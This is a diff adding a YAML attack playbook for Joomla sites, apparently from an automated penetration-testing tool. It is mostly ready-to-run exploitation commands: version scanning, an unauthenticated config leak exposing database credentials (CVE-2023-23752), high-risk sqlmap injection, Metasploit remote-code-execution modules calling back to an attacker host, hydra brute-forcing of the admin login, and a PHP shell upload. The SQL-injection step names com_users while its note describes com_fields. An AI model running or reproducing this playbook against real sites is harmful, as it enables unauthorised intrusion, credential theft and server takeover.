@@ -1,0 +1,40 @@
+id: tech_joomla
+title: "Joomla — Joomscan + com_users SQLi + admin → RCE"
+phase: exploit
+mitre: ["T1190"]
+trigger:
+  services: ["http", "https"]
+  ports:    [80, 443, 8080, 8443]
+  technologies: ["joomla", "/administrator", "joomla.javascript", "/components/com_"]
+  cves:     ["CVE-2017-8917", "CVE-2015-8562", "CVE-2023-23752"]
+keywords: ["joomla", "joomscan", "com_users", "joomla rce", "akeeba"]
+preconditions:
+  - "/administrator/ reachable OR Joomla! generator meta tag visible"
+steps:
+  - tool: joomscan
+    cmd:  "joomscan -u {base_url}"
+    why:  "Version + components + known CVE flagging"
+  - tool: curl
+    cmd:  "curl -s {base_url}/administrator/manifests/files/joomla.xml | grep version"
+    why:  "Exact version disclosure"
+  - tool: curl
+    cmd:  "curl -s '{base_url}/api/index.php/v1/config/application?public=true'"
+    why:  "CVE-2023-23752 — unauth API config disclosure (Joomla 4.0.0-4.2.7), leaks DB creds"
+  - tool: sqlmap
+    cmd:  "sqlmap -u '{base_url}/index.php?option=com_users&view=registration' --data='Itemid=1' --level=3 --risk=3 --batch"
+    why:  "CVE-2017-8917 SQLi on com_fields list[fullordering] (Joomla 3.7.0)"
+  - tool: msfconsole
+    cmd:  "msfconsole -qx 'use exploit/multi/http/joomla_http_header_rce; set RHOSTS {target}; set TARGETURI /; set LHOST {LHOST}; run'"
+    why:  "CVE-2015-8562 — User-Agent unserialize RCE (Joomla 1.5.0-3.4.5)"
+  - tool: hydra
+    cmd:  "hydra -L users.txt -P passwords.txt {target} http-form-post '/administrator/index.php:username=^USER^&passwd=^PASS^&option=com_login&task=login&return=L2FkbWluaXN0cmF0b3Iv:F=Username and password do not match'"
+    why:  "Admin login bruteforce"
+  - tool: msfconsole
+    cmd:  "msfconsole -qx 'use exploit/unix/webapp/joomla_comjce_imgmanager; set RHOSTS {target}; set TARGETURI /; set LHOST {LHOST}; run'"
+    why:  "Post-cred upload via JCE / template editor → PHP shell"
+expected_outcome: "Admin → template editor → PHP RCE; or unauth config-leak DB → app DB pwn"
+fallbacks:
+  - "Akeeba Backup exposed → download full site + DB tarball (CVE-2014-9737)"
+  - "If 4.x with API → CVE-2023-23752 leaks /v1/users + /v1/config — sometimes API tokens"
+references:
+  - "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla"
